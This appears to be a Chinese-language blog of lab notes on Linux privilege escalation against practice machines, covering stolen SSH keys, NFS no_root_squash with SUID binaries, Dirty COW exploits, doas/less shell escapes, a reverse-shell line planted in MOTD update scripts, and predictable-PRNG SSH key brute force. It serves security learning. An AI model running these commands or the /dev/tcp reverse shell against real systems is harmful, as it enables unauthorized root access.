+<p><img src="https://i-blog.csdnimg.cn/img_convert/478f7e3162a957d69f270b9140793b1b.png" alt="image-20251127215112157"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>读一下，正好是私钥，复制下来</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/fb460af1a0ac2cddf28bed7055a0adbf.png" alt="image-20251127215215601"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>拿到kali中保存，既然是私钥，那就试试能不能SSH登录高权限用户，kali使用前记得给权限600以上就行</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/c6b89886a2964743d26a48e1e0b0e8a1.png" alt="image-20251127215425028"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>这里连接的时候说，缺少密钥的算法类型，给他</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/d5a4370f05a660b5489508ac2fa71faa.png" alt="image-20251127215614773"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>他又说没有共同的签名支持，缺少pubkey公钥类型，给他</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/eca4179e98e5e2a6e4271ee093285848.png" alt="image-20251127215809496"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>成功SSH登录root账户</p>
+<blockquote>
+<p>[!NOTE]</p>
+<p>对于查找到的密钥文件，不论是公钥还是私钥，都有进一步尝试的价值</p>
+</blockquote>
+<h2 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h2><p>在 Linux 中，<strong>NFS</strong> 是 <strong>Network File System</strong>（网络文件系统）的缩写，是一种由 <strong>Sun Microsystems</strong>（现为 Oracle）开发的分布式文件系统协议，允许客户端计算机通过网络像访问本地文件一样访问远程服务器上的文件。</p>
+<hr>
+<p><strong>✅ 一句话总结：</strong></p>
+<blockquote>
+<p><strong>NFS 让你可以把远程服务器的目录挂载到本地，像使用本地硬盘一样使用它。</strong></p>
+<p><strong>NFS 就是 Linux 下的“网络共享文件夹”，简单高效，适合局域网内多台 Linux 机器共享文件。</strong></p>
+<p>可以用于信息搜集撕口子，也能提权</p>
+</blockquote>
+<p>枚举的时候看<code>cat /etc/exports</code>是否有NFS服务（nmap做系统枚举的时候也能看到相关信息）</p>
+<blockquote>
+<p><code>/etc/exports</code> 是 <strong>NFS 服务端的“共享目录白名单”</strong></p>
+</blockquote>
+<p><strong>真正生效的“致命一行”</strong></p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp          *(rw,sync,insecure,no_root_squash,no_subtree_check)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong><code>/tmp</code></strong> →共享路径， 服务器把 <strong>全局可写目录</strong> 共享出去；</li>
+<li><strong><code>\*</code></strong> → <strong>任意 IP</strong> 都能挂载（<strong>无源限制</strong>）；</li>
+<li><strong><code>rw</code></strong> → <strong>都可读写</strong>；</li>
+<li><strong><code>sync</code></strong> → <strong>同步</strong>，所有操作都立即生效</li>
+<li><strong><code>insecure</code></strong> → 允许使用非保留的端口进行连接 <strong>&gt;1024 源端口</strong>（客户端 NAT 场景）；</li>
+<li><strong><code>no_root_squash</code></strong> → <strong>客户端 root ≡ 服务器 root</strong>（<strong>提权金钥匙</strong>）；不希望将root用户请求映射为匿名用户，即允许以root用户方式连接NFS &#x2F;tmp这个目录下</li>
+<li><strong><code>no_subtree_check</code></strong> → 性能优化，安全校验关闭。</li>
+</ul>
+</blockquote>
+<p>在kali中，切换到root模式，这样确保连接的时候是以root身份进行连接</p>
+<p>然后在<code>/tmp</code>目录下建立任意名称的目录，这里叫 <code>nfs</code></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/c12fada47762426d0ef7ee7eef6175c2.png" alt="image-20251128185227283"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/nfs</span><br><span class="line">mount -o rw,vers=3 靶机IP:/tmp /tmp/nfs</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>然后进行挂载<code>mount</code></li>
+<li>选项<code>-o</code>：允许读写（我们要在里面写入反弹shell）；指定NFS的版本 <code>vers=2/3</code>（避免他是4,安全机制和共享机制有些差别）</li>
+<li>接NFS的服务地址</li>
+<li>挂载到我们刚才建立的<code>/tmp/nfs</code>路径下</li>
+</ul>
+<p>结果是创建了一个<strong>软连接</strong>，挂载成功。<strong>挂载后</strong>，你对 <code>/tmp/nfs</code> 的所有读写 <strong>直接操作靶机硬盘</strong>。</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/7141a39178881e5df1253bbd3968f494.png" alt="image-20251128185355110"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>可以看到<code>/tmp/nfs</code>目录下有这些文件，我们不用管，我们只想写入反弹shell的命令</p>
+<p>在root用户下用<code>msfvenom</code>生成我们想要的最简命令脚本，这样脚本就有root属主的权限</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/687ae1869716d8d121628368c3f6c54e.png" alt="image-20251128185558352"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf</span><br></pre></td></tr></table></figure>
+
+
+<table>
+<thead>
+<tr>
+<th><code>-p linux/x86/exec</code></th>
+<th><strong>载荷（payload）</strong>：<code>exec</code>模块，<strong>只负责执行一条系统命令</strong>，无网络、无回连</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>CMD=&quot;/bin/bash -p&quot;</code></td>
+<td><strong>要执行的命令</strong>：<code>/bin/bash -p</code> <code>-p</code>保持 euid&#x3D;0，防止 bash 自动降权</td>
+</tr>
+<tr>
+<td><code>-f elf</code></td>
+<td><strong>输出格式</strong>：ELF 可执行文件（Linux 原生格式）</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>[!NOTE]</p>
+<p><strong>ELF 就是 Linux 的‘exe’：头里告诉你怎么加载、段里放代码和数据，红队改入口、改 GOT、改 INTERP 就能劫持执行流。</strong></p>
+</blockquote>
+<p>给他<strong>xs</strong>权限，这样我们就能在靶机中以root身份执行他，执行以后将以属主的权限新建一个bash</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/9bf10f1180817aa0c85979b36250d1ae.png" alt="image-20251128191306496"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>cd到tmp目录下，看到确实挂载了<code>shell.elf</code>，执行后成功获得root权限</p>
+<blockquote>
+<p>生成的<code>shell.elf</code></p>
+<ul>
+<li><strong>体积超小</strong>（几百字节），<strong>无网络特征</strong> → 绕过流量审计。</li>
+<li><strong>不依赖 libc 路径</strong> → 旧系统&#x2F;容器通用。</li>
+<li><strong>立即生效</strong> → 适合“只能写、不能编译”的靶机。</li>
+</ul>
+</blockquote>
+<blockquote>
+<p>[!NOTE]</p>
+<p>不用<code>msfvenom</code>生成脚本的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/mnt</span><br><span class="line">mount -t nfs -o vers=3 靶机IP:/tmp /tmp/mnt</span><br><span class="line">cd /tmp/mnt</span><br><span class="line">cp /bin/bash .</span><br><span class="line">chmod +xs bash               # 造 SUID bash</span><br><span class="line">./bash -p                    # 拿 root</span><br></pre></td></tr></table></figure></blockquote>
+<h2 id="内核漏洞利用提权"><a href="#内核漏洞利用提权" class="headerlink" title="内核漏洞利用提权"></a>内核漏洞利用提权</h2><blockquote>
+<p>[!NOTE]</p>
+<p><strong>要点： 选择，适配，调试，靶机环境 一个不行另一个</strong></p>
+</blockquote>
+<blockquote>
+<p>[!CAUTION]</p>
+<p><strong>内核漏洞一般是没办法的时候才用，很容易导致系统不稳定，警告管理员，导致渗透测试&#x2F;攻防的失败</strong></p>
+</blockquote>
+<p><strong>今天 Linux 最新稳定内核是 6.13.8，长期支持版 6.6.63；打靶先看 uname -r，5.15&#x2F;4.18&#x2F;3.10 分别对应 Ubuntu 22、CentOS 8、CentOS 7 三大常用靶机版本。</strong></p>
+<p><code>uname -a</code>查看内核版本</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/d9aeb1dd0a1eb9fd79ef9ed2945db02b.png" alt="image-20251128192208068"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>我们用linpeas.sh来实现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#linpeas官方推荐最佳实践，管道符给到sh执行linpeas的脚本，最大的好处是直接在线下载，直接执行，并不在本地存有任何文件</span><br><span class="line">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh </span><br></pre></td></tr></table></figure>
+
+<p>这里发现靶机中并没有安装curl，变通一下</p>
+<p>在kali中下载好linpeas</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/75c6f6ad20eee22ed40cd18dad357654.png" alt="image-20251128192654492"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>用nc建立一个监听，同时把<code>linpeas</code>输入到nc中</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/d60fc819299636120279a453a9883e9e.png" alt="image-20251128192824642"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>然后在靶机中执行扫描：用cat接收伪设备传过来的linpeas ，执行后会在内存中进行扫描（wget kali中的linpeas可以，但不是最佳实践 ）</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/15f0ab38d1697081ab87af1e8f3ed312.png" alt="image-20251128193023341"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>扫描结果显示有dirty cow，probable，40611（记录有很多条，一个个试就行）</p>
+<p>看完以后回到kali，<code>searchsploit 40611</code>，和靶机的内核版本号是吻合的，就用它试试<code>-m</code>镜像下载</p>
+<p>看一下里面的内容</p>
+<blockquote>
+<p>[!CAUTION]</p>
+<p>注释非常重要，一定要看</p>
+<p>这里的执行使用方式比较复杂，需要<strong>依次输入各行命令</strong></p>
+<blockquote>
+<p>sudo -s</p>
+<p>echo xxx &gt; foo</p>
+<p>…</p>
+<p>编译方式 <code>gcc -pthread dirtyc0w.c -o dirtyc0w</code></p>
+<p>编译完成直接执行 <code>./dirtyc0w foo m000000000000000000000000000000</code></p>
+</blockquote>
+</blockquote>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/2b3df2b34e81fc352cd3fd4fbc9bc0b0.png" alt="image-20251128193831391"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>kali建立简易服务器 <code>sudo php -S 0:80</code></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/b881d06167e5e74d9b25440bbf6a5535.png" alt="image-20251128194223669"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>在靶机上下载<code>40611.c</code></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/bc9cadd736e789385da240cf8d3fa579.png" alt="image-20251128194331156"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>进行编译 <code>gcc -pthread 40611.c -o 40611</code></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/c63822fec262b97b83015ec3afff0647.png" alt="image-20251128194429793"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>然后按步骤走，这里就不演示了</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/2b3df2b34e81fc352cd3fd4fbc9bc0b0.png" alt="image-20251128193831391"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><code>searchsploit</code>其他脚本利用： 我们根据关键词<code>dirtycow</code>进行搜索，内核 <code>2.6.22-3.9</code>都可以考虑，而在每一个利用名称的后面，有一个实现方法</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/ae563359ca5e27b38b78f9c2d1e89f22.png" alt="image-20251128195228057"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><code>write acces method</code>：<strong>写访问的方法</strong>，对内存进行读取，理论上可以读取内存中的任何字段（稍微复杂一点点，但更有通用性）</p>
+<p><code>/etc/passwd method</code>他是对<strong>passwd</strong>进行操作（看起来更直观简单）</p>
+<p>从利用的实现方法来说，都属于<code>Race Condition</code>静态条件</p>
+<p>下面是<code>40839.c</code>使用： 按他的编译以后；直接执行或执行并给他一个新密码；<code>su</code>即可提权。看起来更简洁</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/6011be77d454327c2698788f5a8bc24d.png" alt="image-20251128195644383"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>靶机中下载kali中的<code>40839.c</code></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/8aa160192f6c6774be8442b7be551d0f.png" alt="image-20251128195955027"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>按照说明编译：</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/dfbe7fb8293a16e4e239dc9c02e4c005.png" alt="image-20251128200034598"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>执行后，让你输入一个新用户firefart（脚本里面自带的名称）的密码</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/616dba331cc059ceeb0ece95fea42fa2.png" alt="image-20251128200503064"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>执行过程：</p>
+<ul>
+<li>首先将<code>/etc/passwd</code>进行备份到<code>/tmp/passwd.bak</code> 我们实际利用passwd提权时也是这样</li>
+<li>然后输入新用户<code>firefart</code>（脚本里面自带的名称）的密码</li>
+<li>之后将你输入的密码转为hash值，写成<code>passwd</code>文件中的格式 **用户名:密码哈希:用户id:组id: : : **的格式</li>
+<li>将这一串格式的字符写入内存，过程有点慢</li>
+<li>最终成功创建新用户 firefart ：你输入的密码</li>
+</ul>
+<p>接下来切换到该用户即可 <code>su/su firefart</code></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/913f8d087f597ce5c47818cb47446502.png" alt="image-20251128201338464"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<h2 id="doas-less-vi提权"><a href="#doas-less-vi提权" class="headerlink" title="doas less + vi提权"></a>doas less + vi提权</h2><blockquote>
+<p>[!NOTE]</p>
+<p><strong>doas 就是‘轻量版 sudo’：配置一两行就能让普通用户升 root，代码短小漏洞少，OpenBSD&#x2F;Alpine 标配</strong></p>
+</blockquote>
+<p>OpenBSD</p>
+<p>看id时候，发现分属于两个用户组</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/62825a57a6ed53908079912e3ed0c36c.png" alt="image-20251128203315992"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/dceae30b5f446ca15bffdfc7dc5a170b.png" alt="image-20251128203852982"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>user用户有权限的文件如右图 backup.7z是破解登录该用户密码的文件，这里不用管</p>
+<p>看当前用户有哪些特权文件</p>
+<p><code>debian/ubuntu</code>系统下会是<code>sudo</code> 而现在 **<code>preBSD/openBSD</code>**通常是<code>doas</code> 作为提升用户权限的手段</p>
+<p>查看<code>doas</code>的配置文件 <code>cat /etc/doas.conf</code> （经验）</p>
+<p>这条命令类似于<code>sudo -l</code></p>
+<p><strong>允许没有密码的情况下，保留用户当前环境变量，user这个用户可以按照root执行less 后面可以接参数</strong></p>
+<table>
+<thead>
+<tr>
+<th><code>keepenv</code></th>
+<th><strong>保留用户当前环境变量</strong>（等价<code>doas -E</code>）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>user</code></td>
+<td><strong>限定单用户</strong>（不是组）</td>
+</tr>
+<tr>
+<td><code>as root</code></td>
+<td><strong>以 root 身份</strong>运行</td>
+</tr>
+<tr>
+<td><code>cmd /usr/bin/less</code></td>
+<td><strong>只能执行<code>/usr/bin/less</code>这一个二进制</strong></td>
+</tr>
+<tr>
+<td><code>args /var/log/authlog</code></td>
+<td><strong>且参数必须完全匹配<code>/var/log/authlog</code></strong>（不能多、不能少）</td>
+</tr>
+</tbody></table>
+<p>执行看看（&#x2F;authlog是参数）</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/c3a971b8f1e415e2c9d197b8ac815f4e.png" alt="image-20251128205341048"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>这里相当于用less命令读这个日志</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/01e59796e0eb141d7f1416b1e54a8d0c.png" alt="image-20251128205432187"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/333ecb9e360a85ab9a75dae9da601bbb.png" alt="image-20251128205608819"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>这里有个less的选项，就是v：打开文本编辑器编辑这个文档。我们现在是读，按v会启动vi编辑这个文档，如下图</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/d5e6397e5725deedda420f4b5e4e5561.png" alt="image-20251128205622981"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<blockquote>
+<p>[!IMPORTANT]</p>
+<p>现在是可编辑状态，我的权限是doas给的，相当于权限被提高了，大多数如果不做特殊配置的话，他就是系统的权限，这个权限如何把他引导到shell里？doas有高权限，用高权限启动一个shell，而现在在vi里，这个编辑器要想执行shell命令，这也是vi自有的命令 用 <strong><code>:</code> <code>!</code></strong> 执行shell命令</p>
+<p>less命令有v这个操作，v能打开vi编辑器，而vi编辑器他已经是继承less的doas权限，doas权限我能启动一个shell，就能提权</p>
+</blockquote>
+<p>less打开日志后，按<strong>v</strong>，直接按**!**启动一个新的shell，shell里面继续执行sh。回车后获得root权限</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/66f53b6009da3582983a2a1bea4a358c.png" alt="image-20251128210711763"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<h3 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h3><h4 id="为什么-sudo-不拦截？"><a href="#为什么-sudo-不拦截？" class="headerlink" title="为什么 sudo 不拦截？"></a>为什么 sudo 不拦截？</h4><ul>
+<li>sudo 只检查了 <strong>最初命令路径</strong>（<code>/usr/bin/less</code>）</li>
+<li><strong>less 的子进程</strong> 属于 <strong>合法 root 进程的自我派生</strong>，<strong>sudo 不再二次校验</strong> → <strong>只要程序本身带 <code>!command</code> 功能，就能逃逸</strong></li>
+</ul>
+<h4 id="哪些程序有-逃逸"><a href="#哪些程序有-逃逸" class="headerlink" title="哪些程序有 ! 逃逸"></a>哪些程序有 <code>!</code> 逃逸</h4><table>
+<thead>
+<tr>
+<th>程序</th>
+<th>按键</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>less&#x2F;more</strong></td>
+<td><code>!sh</code></td>
+<td>最常见</td>
+</tr>
+<tr>
+<td><strong>vim&#x2F;nano</strong></td>
+<td><code>:!/bin/sh</code></td>
+<td>同样有效</td>
+</tr>
+<tr>
+<td><strong>man</strong></td>
+<td><code>!sh</code></td>
+<td>内部用 less</td>
+</tr>
+<tr>
+<td><strong>mail&#x2F;mutt</strong></td>
+<td><code>!sh</code></td>
+<td>邮件客户端</td>
+</tr>
+<tr>
+<td><strong>ftp</strong></td>
+<td><code>!sh</code></td>
+<td>交互命令</td>
+</tr>
+</tbody></table>
+<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p><strong>“<code>!sh</code> 是 less 内置的‘外部命令’功能，fork 时继承当前 root 身份，sudo 只检查首程序路径，不拦子进程 → 按一下 !sh 就 root；修掉给 less 加 noexec 或换 sudoedit 即可。”</strong></p>
+<h2 id="利用MOTD机制提权"><a href="#利用MOTD机制提权" class="headerlink" title="利用MOTD机制提权"></a>利用MOTD机制提权</h2><blockquote>
+<p>[!NOTE]</p>
+<p>motd &#x3D; <strong>Message of the Day</strong>（每日消息）</p>
+<ul>
+<li>纯文本文件，<strong>用户每次登录 SSH&#x2F;TTY 后自动显示</strong>。</li>
+<li>常用于 <strong>法律声明、管理员通知、系统状态、彩蛋标语</strong>。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>路径</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/etc/motd</code></td>
+<td><strong>静态公告</strong>（最常用），登出-再登录即更新。</td>
+</tr>
+<tr>
+<td><code>/etc/motd.d/*.conf</code></td>
+<td><strong>systemd 分段</strong>，按字母顺序拼接。</td>
+</tr>
+<tr>
+<td><code>/run/motd.dynamic</code></td>
+<td><strong>动态脚本输出</strong>（<code>pam_motd</code>调用）。</td>
+</tr>
+<tr>
+<td><code>~/.motd</code></td>
+<td><strong>用户个人</strong>（极少用）。</td>
+</tr>
+</tbody></table>
+<p><strong>motd 就是登录后自动显示的‘今日公告’文件，常放法律声明或系统彩蛋；红队可用来钓鱼、留标语、藏 flag，改 <code>/etc/motd</code> 立刻生效</strong></p>
+</blockquote>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/29dc291b3205dcb42db5185d25869334.png" alt="image-20251128211605016"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><code>00-header</code>排在最先显示的，而<code>update</code>是对<code>motd</code>进行更新的<strong>一组</strong>脚本，因为 <code>.d</code>是指目录，目录里面是脚本</p>
+<p><code>motd</code>是全局性的，脚本执行性的，Linux里面经常会有的应用</p>
+<p>只要看到 <code>motd update 00-header</code>肯定会想到利用</p>
+<p><code>00-header</code>里面执行的 <code>#!/bin/sh 和 print 语句</code>我们就可以把反弹shell写进去，保存退出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/kaliIP/监听端口 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/img_convert/f17b6f1c94993ec5070e2d8496a1a32d.png" alt="image-20251128212400891"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>按下图操作，用户SSH登录后，出发MOTD欢迎界面，执行我们的恶意命令</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/02aa298ed2c8163e8e7ea52897b0d912.png" alt="image-20251128213114519"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>root权限</p>
+<h2 id="可预测PRNG暴力破解SSH提权"><a href="#可预测PRNG暴力破解SSH提权" class="headerlink" title="可预测PRNG暴力破解SSH提权"></a>可预测PRNG暴力破解SSH提权</h2><blockquote>
+<p>[!NOTE]</p>
+<p>对应<strong>靶机精炼</strong>的”pWnOS1.0 - 选择hard模式再次用完全不同的方法实现这台靶机的渗透测试。-解法二“</p>
+</blockquote>
+<p>下面演示的是获得初始权限的过程，提权也是同理</p>
+<h3 id="用公钥信息破解出私钥（精）"><a href="#用公钥信息破解出私钥（精）" class="headerlink" title="用公钥信息破解出私钥（精）"></a>用公钥信息破解出私钥（精）</h3><p><img src="https://i-blog.csdnimg.cn/img_convert/75efe2e9b70bf64d4b34d3d111ffc5de.png" alt="image-20251112185610932"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>我们拿到的authorized_keys是<strong>公钥</strong> ，公钥一定是放在服务器端的，私钥是管理员自己电脑上，用私钥连接服务器的公钥</p>
+<blockquote>
+<p>[!IMPORTANT]</p>
+<p>我们需要有自己的私钥库进行碰撞，操作时需要用到伪随机数生成器的库 <strong>(相当于密码表—不一定会成功，可以多换用户公钥或换密码本)</strong></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit prng       preudo random number generator</span><br><span class="line">                      伪        随机的 数字  生成器</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/img_convert/5a3c09942aa1d1f3544f40c86d429dfe.png" alt="image-20251128214053156"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>这里涉及到<strong>ssh非对称加密的机制</strong>的理解，虽然不需要了解算法，但是要知道非对称加密中涉及到<strong>prng</strong>这样一件事</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/984444aeb1188c6e6edab1ed1928b4da.png" alt="image-20251112190413247"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>下载一个镜像</p>
+<p>我们采用伪随机数生成器的机制进行碰撞，获得私钥（相当于有公钥，和所有的私钥，找到对应的即可）</p>
+<p>运行脚本</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/ee0734468e90c8fee0350bc933a78f2c.png" alt="image-20251112190851409"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
